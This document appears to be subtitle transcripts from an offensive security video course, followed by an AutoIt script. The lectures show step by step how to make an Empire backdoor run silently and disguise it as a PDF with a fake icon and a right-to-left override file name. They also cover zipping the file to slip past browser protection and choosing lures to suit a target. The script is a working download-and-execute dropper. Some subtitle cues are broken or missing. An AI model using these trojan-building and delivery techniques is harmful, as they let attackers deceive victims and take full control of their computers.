00:04:40,730 --> 00:04:43,820
And this is the main window of the program.

65
00:04:44,000 --> 00:04:46,350
Now, using this program is very simple.

66
00:04:46,370 --> 00:04:49,500
All we have to do is, first of all, open our backdoor.

67
00:04:49,520 --> 00:04:52,370
So we're going to go to file Open.

68
00:04:54,460 --> 00:04:57,310
And it's already in my evil files directory.

69
00:04:57,310 --> 00:05:00,700
But if it wasn't, it will probably be in the downloads for you.

70
00:05:00,730 --> 00:05:06,580
You're going to have to click on this go on the base, which is just a forward slash in here.

71
00:05:07,720 --> 00:05:12,160
Then navigate to var, so we'll have to go here to the right.

72
00:05:12,190 --> 00:05:22,420
Here is var w-w-w HTML eval files, and in here we're going to select our backdoor, which is empire

73
00:05:22,420 --> 00:05:25,180
http 80 etcbut.

74
00:05:25,180 --> 00:05:30,250
So this is the backdoor or the file that we want to convert from bat to x.

75
00:05:31,790 --> 00:05:35,870
I'm going to click on Open and this will open its code in here.

76
00:05:36,140 --> 00:05:41,690
Now, the main option that we want to modify is the X format.

77
00:05:41,990 --> 00:05:48,920
So we want to set this to either 64 invisible or 32 invisible.

78
00:05:49,100 --> 00:05:51,790
So select the architecture of the target.

79
00:05:51,800 --> 00:05:58,370
I'm going to set it to 64 and make sure you select the invisible one so that your program gets executed

80
00:05:58,370 --> 00:06:01,970
in the background without showing any suspicious windows.

81
00:06:03,210 --> 00:06:08,580
Now you can also configure your executable to request administrator privileges.

82
00:06:08,610 --> 00:06:12,210
This will allow you to have admin privileges when your back door runs.

83
00:06:12,210 --> 00:06:17,220
We'll talk more about privilege escalation later on in the Post-exploitation section.

84
00:06:17,220 --> 00:06:19,920
So I'm going to uncheck this and that's it.

85
00:06:19,920 --> 00:06:21,180
I'm ready to go.

86
00:06:21,180 --> 00:06:23,370
So I'm going to go to convert.

87
00:06:24,140 --> 00:06:25,700
And click on Convert.

88
00:06:26,900 --> 00:06:31,550
This will ask me where do I want to store the file after converting it to X?

89
00:06:32,210 --> 00:06:39,570
Now it's already in evil files by default and it's already set in the name here to empire http 88 dot

90
00:06:39,620 --> 00:06:40,130
x.

91
00:06:40,310 --> 00:06:44,060
So I'm going to keep that the same and I'm just going to click on Save.

92
00:06:45,530 --> 00:06:46,520
Now that's it.

93
00:06:46,520 --> 00:06:50,780
As you can see, my bat file has been successfully converted to X.

94
00:06:51,940 --> 00:06:58,270
Now, if I refresh the evil files page here, you'll see that I have a new entry and this is called

95
00:06:58,270 --> 00:07:01,640
Empire http 88 dot x.

96
00:07:01,840 --> 00:07:03,370
Notice it's not that bad.

97
00:07:03,400 --> 00:07:04,480
It's dot x.

98
00:07:05,470 --> 00:07:07,090
Now I'm going to download that.

99
00:07:08,190 --> 00:07:09,240
And save it.

100
00:07:10,910 --> 00:07:17,750
And if we look at the downloads file, you'll see we have the file right here, Empire Http status.

101
00:07:18,350 --> 00:07:20,900
And once I double click this.

102
00:07:22,420 --> 00:07:27,690
You'll see that it's going to run now in the background and it didn't show any pop up windows.

103
00:07:27,700 --> 00:07:32,530
So I got executed silently in the background with no pop up windows.

104
00:07:32,860 --> 00:07:38,890
And if we go to the Kali machine, you'll see that we receive the connection and we can interact with

105
00:07:38,890 --> 00:07:40,420
it by going to agents.

106
00:07:42,130 --> 00:07:45,550
And interact with SR.

107
00:07:46,490 --> 00:07:49,970
Hit a tab to autocomplete and we're in.

108
00:07:50,300 --> 00:07:57,320
And basically our backdoor got executed silently without showing any pop up windows.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,110 --> 00:00:07,010
So far we've seen how to make our eval files function like a file that the target person trusts.

2
00:00:07,010 --> 00:00:13,850
So we've seen how to use the download and execute batch script to run our eval file in the background,

3
00:00:13,850 --> 00:00:19,610
and at the same time present a file that the person trusts, such as an image or a PDF.

4
00:00:20,360 --> 00:00:26,840
The only problem is the icon of this file of the download and execute batch script is still suspicious.

5
00:00:26,840 --> 00:00:31,580
It still doesn't refer to an image or a PDF or anything that we're trying to mimic.

6
00:00:31,580 --> 00:00:39,110
And when you execute this, you'll see we'll get two pop up windows before the file that the person

7
00:00:39,110 --> 00:00:40,130
is expecting.

8
00:00:40,580 --> 00:00:47,360
The first pop up window that you get with this is the one that's related to the batch script itself,

9
00:00:47,360 --> 00:00:49,640
to the download and execute batch script.

10
00:00:49,640 --> 00:00:55,340
And the second pop up window is the one that's related to the Empire backdoor, because we're actually

11
00:00:55,340 --> 00:00:57,770
using the bat backdoor.

12
00:00:57,770 --> 00:01:01,130
So it's the Non-silent one, the one that shows a pop up.

13
00:01:02,210 --> 00:01:09,590
So to get rid of the second pop up, all we have to do is use the Empire backdoor that we created previously,

14
00:01:09,590 --> 00:01:10,850
the silent one.

15
00:01:10,850 --> 00:01:14,000
So I'm going to modify my batch script right now.

16
00:01:14,990 --> 00:01:19,790
So I have it in here in my evil files and I have my download and execute.

17
00:01:20,690 --> 00:01:23,090
I'm going to open it with my text editor.

18
00:01:24,070 --> 00:01:26,080
And you can see that right here.

19
00:01:26,080 --> 00:01:32,050
I'm using the Empire backdoor that's not silent, the one that's generated by the program itself.

20
00:01:32,530 --> 00:01:34,510
So I'm going to change the URL here.

21
00:01:34,510 --> 00:01:37,630
And I'm, I'm going to put the x one.

22
00:01:37,630 --> 00:01:40,720
And that's the one that we created in the previous lecture.

23
00:01:40,720 --> 00:01:45,910
The one that runs without showing any windows that run silently.

24
00:01:45,910 --> 00:01:48,940
So it's basically this one right here.

25
00:01:50,070 --> 00:01:51,540
So that's very good.

26
00:01:52,410 --> 00:01:58,350
And doing this will prevent the second pop up from showing up because our backdoor is silent now.

27
00:01:59,170 --> 00:02:04,990
We still have the first pop up that shows up, and that's the one that's related to the download and

28
00:02:04,990 --> 00:02:06,970
execute script itself.

29
00:02:07,690 --> 00:02:13,570
So to get rid of the first pop up window that we see, we're going to use the exact same method that

30
00:02:13,570 --> 00:02:20,170
we used in the previous lecture to convert this download and execute batch script to a silent exe.

31
00:02:20,470 --> 00:02:26,710
Again, to do this we're going to use the same tool, which is bad to exe, and we'll also use the same

32
00:02:26,710 --> 00:02:34,540
tool to add an icon to our download and execute script, so that it has a proper icon that represents

33
00:02:34,540 --> 00:02:36,910
the file that the user will see.

And I'm going to use a PDF icon because I'm trying to make the file look and function like a PDF.

35
00:02:44,320 --> 00:02:48,400

And I'm going to include this in the resources of the lecture.

And you can see that this PDF icon right here is pretty much the same one that windows shows by default

39

if Acrobat Reader is installed.

40

What you want to make sure is you want to download an icon with a large with a high size so that it

41

doesn't look weird and it looks like a native icon.

42
00:03:15,500 --> 00:03:19,610

44

And I'm going to use another online service to convert this to a icon, a dot icon file, because we

45

46
00:03:34,690 --> 00:03:41,260
Again, I'm going to include the link for this website in the resources and then select the icon that

47

48
00:03:42,100 --> 00:03:44,590
So my icon is in my downloads.

49

Click on open.

50

We're going to click on convert.

And that's going to convert it for me and allow me to save it.

52

I'm going to click on okay and that will automatically put it in my downloads.

53
00:04:02,020 --> 00:04:09,550
Now we're ready to convert the download and execute script to an executable and add the PDF icon to

54
00:04:09,550 --> 00:04:09,910
it.

55
00:04:09,910 --> 00:04:15,280
Like I said, we're going to be using the Bud two X tool that I showed you before to do that.

Now I already have the tool running in here, and we're going to go to File Open to load our download

57

Again.

W w w HTML evil files, and we're going to call it this time.

Download and execute Pdftex.

of a PDF.

normal PDF icon that you'd usually see.

And because we used a high res icon, even if I view this with a larger icons, it'll still look very

90

similar to a normal PDF that you download.

00:06:40,690 --> 00:06:44,530
Now, if I give this a double click, you'll see that this is.

92

This should run with no pop up windows at all, except for the ones that the target person expects.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,140 --> 00:00:06,740
Now we know how to convert our evil files and make them function like files that the target person trusts.

2
00:00:06,770 --> 00:00:12,500
It won't show anything that will make the target person thinks that suspicious things are happening,

3
00:00:12,500 --> 00:00:18,740
and it will also have an icon that will look similar to what the target person expects.

4
00:00:19,560 --> 00:00:26,430
The only problem with the files that we've been generating is that it does not have a convincing extension.

5
00:00:26,430 --> 00:00:30,450
So you can see that the file name ends up with a dot exe.

6
00:00:30,600 --> 00:00:35,280
Even though we're claiming that this file is a PDF.

7
00:00:35,280 --> 00:00:36,810
So that's an issue.

8
00:00:36,840 --> 00:00:44,130
Now usually on windows systems by default the computer will not actually show the extension, the file

9
00:00:44,130 --> 00:00:44,820
extension.

10
00:00:44,820 --> 00:00:51,390
But still this now is still not 100% convincing because it ends up with a dot exe.

11
00:00:51,720 --> 00:00:58,380
And in this lecture I'm going to show you how to spoof the file name to make it look as if this is a

12
00:00:58,380 --> 00:01:01,680
PDF, even though it's still an EXE.

13
00:01:03,270 --> 00:01:09,600
Now I, like I said before, there is exploits that will allow you to inject the payload inside a proper

14
00:01:09,600 --> 00:01:11,100
PDF or an image.

15
00:01:11,100 --> 00:01:14,490
But these exploits will not always work.

16
00:01:14,490 --> 00:01:18,030
They'll only work with programs that are vulnerable.

17
00:01:18,030 --> 00:01:22,260
And the latest updates of Acrobat and all these programs are not vulnerable.

18
00:01:22,260 --> 00:01:28,230
So even if someone discovers and exploits, say, today, for example, this exploit will probably be

19
00:01:28,230 --> 00:01:30,780
patched next week, if not before that.

20
00:01:31,110 --> 00:01:35,940
So if you use the already exploits, there's a high chance that they won't work.

21
00:01:35,940 --> 00:01:42,540
Where the method that I'm showing you right now does not use any exploits and it will always work.

22
00:01:43,410 --> 00:01:49,380
So what we're going to do here, I'm going to open my leafpad just so that I write the name of the file

23
00:01:49,380 --> 00:01:52,590
in here, just so that it it's easier for you to see.

24
00:01:53,040 --> 00:02:00,750
Now, to spoof the file name, I'm going to use a UTF character that will instruct the computer to read

25
00:02:00,750 --> 00:02:02,850
the characters from right to left.

26
00:02:02,880 --> 00:02:06,690
Now, by default, the computer reads the file name from left to right.

27
00:02:06,690 --> 00:02:12,210
And the way we're going to do this, when we use this character, the computer will read the characters

28
00:02:12,210 --> 00:02:14,280
from right to left.

29
00:02:14,520 --> 00:02:19,110
Now, this is a bit confusing, but once I use it, it will become clear to you.

30
00:02:19,740 --> 00:02:24,660
Now the file name has to end with x, and we know that and there is nothing we can do with that.

31
00:02:25,410 --> 00:02:30,030
Then we're going to have our file name and let's call it for example Z.

32
00:02:30,730 --> 00:02:34,930
So the file like this is very suspicious.

33
00:02:35,050 --> 00:02:41,170
What I'm going to do is I'm going to write the extension that I want to use after the file name.

34
00:02:41,170 --> 00:02:42,580
So I'm going to put a minus.

35
00:02:42,970 --> 00:02:46,240
And then I want to use an extension of a PDF.

36
00:02:46,240 --> 00:02:51,490
So it's PDF because I'm trying to make my file look like a PDF.

37
00:02:52,590 --> 00:02:55,920
Now the reverse of PDF.

38
00:02:56,010 --> 00:03:02,160
If you read it from right to left, it's f d p right.

39
00:03:02,160 --> 00:03:05,100
So instead of a PDF I'm going to delete that.

40
00:03:05,280 --> 00:03:07,200
And I'm going to write in FDP.

41
00:03:09,570 --> 00:03:11,010
All good so far.

42
00:03:11,280 --> 00:03:17,640
Then what I'm going to do is I'm going to use my right to left character in here before the F.

43
00:03:18,000 --> 00:03:19,530
So what's that going to do?

44
00:03:19,530 --> 00:03:25,920
It's going to tell the computer to read everything from from left to right as usual, zayid followed

45
00:03:25,920 --> 00:03:26,880
by the minus.

46
00:03:26,880 --> 00:03:30,930
And then the computer is going to read my right to left character in here.

47
00:03:30,930 --> 00:03:35,760
Once it reads that character, it will start reading stuff from right to left.

48
00:03:35,760 --> 00:03:39,660
So it's going to go e x e dot PDF.

49
00:03:41,150 --> 00:03:42,890
Okay, now let me do it.

50
00:03:42,890 --> 00:03:44,840
It's going to come more, become more clear.

51
00:03:45,050 --> 00:03:51,140
So I'm going to go on this search and search right to left override.

52
00:03:51,140 --> 00:03:54,230
And you can see the character showing up right here.

53
00:03:54,830 --> 00:03:59,450
And you can see that we have a button that will allow us to copy the character.

54
00:03:59,450 --> 00:04:01,910
So I'm going to click on that button.

55
00:04:02,480 --> 00:04:05,840
Now the character itself won't display anything on screen.

56
00:04:05,840 --> 00:04:10,370
It will only tell the computer to read stuff from right to left.

57
00:04:10,580 --> 00:04:18,110
So I'm going to come here, I'm going to click and I'm going to do control V to paste it and watch what's

58
00:04:18,110 --> 00:04:18,860
going to happen.

59
00:04:21,080 --> 00:04:26,180
So you can see now the computer is reading everything from left to right until it hits the right to

60
00:04:26,180 --> 00:04:29,750
left character, and then it read the stuff from right to left.

61
00:04:29,750 --> 00:04:33,170
So at read x dot PDF.

62
00:04:34,430 --> 00:04:35,930
So let me remove that.

63
00:04:36,020 --> 00:04:38,060
See, everything is back to normal.

64
00:04:38,060 --> 00:04:46,160
So it's FDP dot e x e control v, paste the character and it's x e dot pdf.

65
00:04:47,910 --> 00:04:52,350
Now this name is still not good because like, it doesn't really make sense.

66
00:04:52,350 --> 00:04:53,670
It's not really useful.

67
00:04:53,670 --> 00:04:58,560
So I'm going to assume that my target is interested on the human body.

68
00:04:58,560 --> 00:05:03,750
And they're for example, they're studying health science or something related to that.

69
00:05:03,750 --> 00:05:07,920
And I'm going to name my file according to that fact.

70
00:05:07,920 --> 00:05:12,930
So the first thing I'm going to do I'm going to put my X because that's essential.

71
00:05:12,930 --> 00:05:15,600
Like we said, the file name has to end with an x.

72
00:05:16,140 --> 00:05:22,830
Also before the x we need to have the file extension that we need to spoof our file.

73
00:05:22,830 --> 00:05:25,560
And that's going to be FDP.

74
00:05:25,560 --> 00:05:28,530
Like we said, it's the reverse of PDF.

75
00:05:29,010 --> 00:05:30,870
And then we're going to put the file name.

76
00:05:30,870 --> 00:05:36,600
So I'm going to call the file, for example research on human.

77
00:05:37,250 --> 00:05:38,240
Reflex.

78
00:05:38,630 --> 00:05:46,010
And what I'm going to do is I'm actually going to delete the last two x, because these two x will actually

79
00:05:46,010 --> 00:05:48,440
be replaced with the x.

80
00:05:48,590 --> 00:05:51,260
Once I paste my right to left character.

81
00:05:51,950 --> 00:05:53,720
So I'm going to delete that.

82
00:05:54,290 --> 00:05:56,990
And I'm going to paste my right to left character.

83
00:05:56,990 --> 00:06:01,070
And what's going to happen is the computer is going to read the stuff from left to right.

84
00:06:01,070 --> 00:06:08,750
So it's going to read research on human re-fill and stop, and then it's going to read stuff from right

85
00:06:08,750 --> 00:06:09,200
to left.

86
00:06:09,200 --> 00:06:12,020
So it's going to read X to finish the sentence.

87
00:06:12,020 --> 00:06:16,340
So it's going to be human research on human reflex.

88
00:06:17,010 --> 00:06:19,650
And then this will be reversed as well.

89
00:06:19,650 --> 00:06:21,540
And it's going to be read from right to left.

90
00:06:21,540 --> 00:06:24,210
So it's going to be dot PDF.

91
00:06:25,000 --> 00:06:27,670
So I'm going to do control V in here.

92
00:06:29,010 --> 00:06:33,510
And as you can see now, my name is Research on Human Reflex.

93
00:06:33,510 --> 00:06:34,830
And I have an extra E here.

94
00:06:34,830 --> 00:06:35,730
But that's fine.

95
00:06:35,730 --> 00:06:39,060
And then it's ending with dot pdf.

96
00:06:40,330 --> 00:06:42,310
So I'm going to copy this file name.

97
00:06:43,910 --> 00:06:48,710
And I'm going to rename my download and execute PDF in here.

98
00:06:49,220 --> 00:06:56,000
And I'm going to highlight everything, delete it, paste what I have rename and that's done.

99
00:06:57,490 --> 00:07:05,770
Now, the only issue with this file is if we go to the windows machine right here and go to ten, 20,

100
00:07:05,770 --> 00:07:13,780
14 to 13 evil files, you'll see that we have the file here, and you'll see that the name looks fine.

101
00:07:13,780 --> 00:07:18,010
So it's research on human reflex dot pdf.

102
00:07:18,010 --> 00:07:25,270
But when we actually come and try to download it, you'll see that Firefox and modern browsers will

103
00:07:25,270 --> 00:07:31,870
detect that there was a right to left character, and they'll actually replace it with its Unicode equivalent.

104
00:07:31,870 --> 00:07:34,900
So when you download it, it'll still be a dot.

105
00:07:34,900 --> 00:07:36,070
Exe file.

106
00:07:37,130 --> 00:07:45,380
To bypass this issue, we're going to right click this file and compress it to add it to an archive.

107
00:07:45,380 --> 00:07:52,580
And we're just going to use a zip archive because all windows computers support zip natively even if

108
00:07:52,580 --> 00:07:54,530
you don't have a program to open it.

109
00:07:54,530 --> 00:07:57,320
So we're going to add it to a zip archive.

110
00:07:57,320 --> 00:07:59,240
And we're just going to name the file.

111
00:07:59,240 --> 00:08:01,880
We're going to remove the PDF because we don't need that.

112
00:08:01,880 --> 00:08:05,600
And we're just going to call it research on human reflex.

113
00:08:06,500 --> 00:08:07,880
I'm going to create.

114
00:08:08,940 --> 00:08:10,860
And that's my zip right here.

115
00:08:10,860 --> 00:08:12,660
So if I refresh now.

116
00:08:13,320 --> 00:08:15,660
So I have the zip file right here.

117
00:08:16,230 --> 00:08:19,620
And this is the file that you should use to deliver the backdoor.

118
00:08:19,620 --> 00:08:22,710
If you're going to ask the person to download it from a link.

119
00:08:22,710 --> 00:08:28,530
If you are given the file on a USB stick or any other delivery method, then it's fine.

120
00:08:28,530 --> 00:08:35,280
You can just use the exe right here, but if you're sending it through a URL, make sure you zip it

121
00:08:35,280 --> 00:08:41,370
so that when the person downloads it the left to right, the right to left override will not get replaced.

122
00:08:41,790 --> 00:08:43,470
So I'm going to download this.

123
00:08:44,800 --> 00:08:45,850
I'm going to save it.

124
00:08:48,590 --> 00:08:50,780
And I already have WinRAR installed.

125
00:08:50,810 --> 00:08:55,790
Now, if you don't have WinRAR installed, you can just double click this and it will open it for you

126
00:08:55,790 --> 00:08:57,050
in Windows Explorer.

127
00:08:57,050 --> 00:09:01,940
For me, I can just right click it and extract here to uncompress the file.

128
00:09:02,810 --> 00:09:04,940
And you can see the file right here.

129
00:09:04,940 --> 00:09:07,610
It has a PDF icon.

130
00:09:07,610 --> 00:09:11,420
It's called Research on Human Reflex dot pdf.

131
00:09:11,420 --> 00:09:13,250
Notice in here it's dot PDF.

132
00:09:13,250 --> 00:09:16,340
So it looks exactly like a PDF.

133
00:09:16,340 --> 00:09:18,500
And then if we double click this.

134
00:09:21,070 --> 00:09:22,510
It will open my PDF.

135
00:09:22,510 --> 00:09:28,930
There is no suspicious pop up windows and if we go back to our Kali machine to Empire, you'll see that

136
00:09:28,930 --> 00:09:32,440
we got our agent so we can interact with this agent.

137
00:09:33,590 --> 00:09:37,460
And as you can see, we have full control over this computer.

138
00:09:37,460 --> 00:09:43,370
We completely hacked it and we managed to do that with a file that has a PDF icon.

139
00:09:43,370 --> 00:09:46,670
It has a PDF extension and it functions like a PDF.

140
00:09:46,670 --> 00:09:50,150
When the person double clicks it, it's going to work like a PDF.

141
00:09:50,150 --> 00:09:56,780
And the download and execute method that I showed you can be used to combine your evil files with any

142
00:09:56,780 --> 00:09:57,830
type of file you want.

143
00:09:57,830 --> 00:10:04,730
You can combine it with an image, with a song, with a video, and it'll work exactly the same that

144
00:10:04,730 --> 00:10:06,350
it's working right here.

145
00:10:06,350 --> 00:10:10,190
The same goes with changing the icon and changing the extension.

146
00:10:10,190 --> 00:10:16,010
All of this is very generic, and it can be used to mimic any type of file that you want.

147
00:10:16,010 --> 00:10:21,620
So depending on your target, depending on what they're interested in, depending on the information

148
00:10:21,620 --> 00:10:26,780
that you gathered, you should pick a file that the target person is highly likely to open.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:00,920  -->  00:00:02,840
In this lecture, I'd like to show you

2

00:00:03,000  -->  00:00:07,040
another method to create a 'Download and Execute Payload'.

3

00:00:07,920  -->  00:00:11,059
Now, we covered what we mean by a download and execute payload

4

00:00:11,420  -->  00:00:13,800
and we covered why it's useful

5

00:00:13,960  -->  00:00:16,380
and how to do it using a batch script.

6

00:00:17,920  -->  00:00:19,860
The payload that I'm gonna show you today,

7

00:00:20,080  -->  00:00:23,640
is written using a scripting language called AUTOIT.

8

00:00:24,820  -->  00:00:31,080
The main advantage of this payload is the fact that we won't need to use any third-party software such as,

9

00:00:31,540  -->  00:00:35,320
'bat to exe' to convert our batch script to 'exe'.

10

00:00:36,700  -->  00:00:40,880
This is very important because sometimes, some antivirus programs,

11

00:00:40,880  -->  00:00:43,000
usually not very famous antivirus programs,

12

00:00:43,460  -->  00:00:50,800
would flag any file or any executable generated using these third-party software as a virus,

13

00:00:50,800  -->  00:00:53,040
even if that's executable, is not a virus.

14

00:00:53,800  -->  00:00:59,200
So our backdoor, even though that our download and execute batch script, would not be detectable,

15

00:00:59,540  -->  00:01:02,400
once you convert it to 'exe', it'll be detectable.

16

00:01:03,260  -->  00:01:04,900
Now, this is not always the case.

17

00:01:05,040  -->  00:01:07,060
So, sometimes it will get detected

18

00:01:07,240  -->  00:01:12,360
and then the software cray, creators will contact these antivirus programs, tell them look here,

19

00:01:12,360  -->  00:01:15,140
you have some false positives and then they'll fix it.

20

00:01:15,540  -->  00:01:18,960
But if at any stage of time, you generated a batch script,

21

00:01:19,180  -->  00:01:21,420
converted it to exe and got detected,

22

00:01:21,600  -->  00:01:24,180
then you'll have another method under your Arsenal

23

00:01:24,380  -->  00:01:26,900
to create a download and execute payload.

24

00:01:28,600  -->  00:01:31,800
Now, just like the other download and execute payload,

25

00:01:32,120  -->  00:01:36,000
you can use this to download and execute any files you want

26

00:01:36,500  -->  00:01:40,020
and you can use it to generate Trojans and Trojans that you generate,

27

00:01:40,420  -->  00:01:45,760
can be used to make your backdoor look like an image, a PDF or anything that you want.

28

00:01:46,720  -->  00:01:50,280
Now, previously with the 'bat' download 
 and execute payload,

29

00:01:50,460  -->  00:01:54,840
we used it to make our backdoor look
and function like a PDF.

00:01:55,340  -->  00:01:57,520
Now, in this example, just for a change,

00:02:02,500  -->  00:02:06,859
Also with the 'bat' example, we use the Empire backdoor.

again just for a change, just to show you that these scripts are generic

35

00:02:17,285  -->  00:02:19,820
and you can use them any way that you want.

but I already have it downloaded here.

and you'll see the code used, inside the script.

00:02:34,860  -->  00:02:41,060
I programmed this in a way, so that you can use it to download and execute anything and any number of files.

41

00:02:41,680  -->  00:02:46,620
So, all you have to do is literally put the links or the URLs for the files in here

42

00:02:47,040  -->  00:02:52,080
and separate them by a comma, so you can put a URL,URL, and keep going.

43

44

00:02:57,360  -->  00:02:59,120
or any number of files, you want.

 and uploaded on a direct link.

78

00:05:13,360  -->  00:05:17,280
This is very, very important. The script will not work, if you don't use right URLs.

79

00:05:19,600  -->  00:05:25,320
So, as you can see the script is very simple, all we had to do is, put the URL for the first file.

80

00:05:26,200  -->  00:05:29,800
And then, we put a comma which is very, very important again.

81

00:05:30,120  -->  00:05:32,360
So, you have to separate the URLs by a comma.

82

00:05:32,680  -->  00:05:35,120
And, then we put the URL for this second file.

83

00:05:36,040  -->  00:05:40,600
And like I said, if you want to download more files, if you want to download more backdoors or more evil files,

84

00:05:40,980  -->  00:05:44,440
all you have to do is just put another comma and put the next URL.

85

00:05:45,020  -->  00:05:47,660
Now, this is not a program, of course, so I'm not gonna explain,

86

00:05:48,020  -->  00:05:50,020
how I program the script, it's very simple.

87

00:05:50,360  -->  00:05:54,340
Basically, all it's gonna do is, it's gonna download these files

88

00:05:55,020  -->  00:05:58,480
and then execute them and I have the download function in here.

89

00:06:00,220  -->  00:06:03,780
Now, everything is ready for me. I'm gonna save this and close it.

90

00:06:05,980  -->  00:06:08,460
I'm just gonna go back to my downloads to see the script.

91

00:06:08,840  -->  00:06:13,720
And now, all we have to do is compile the script to an executable.

92

00:06:14,320  -->  00:06:17,180
And I'm gonna show you how to do that in the next lecture.

#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urls = "url1,url2"

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)

Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage

00:05:55,140 --> 00:06:02,070

00:06:17,530 --> 00:06:18,790
You have the freedom.
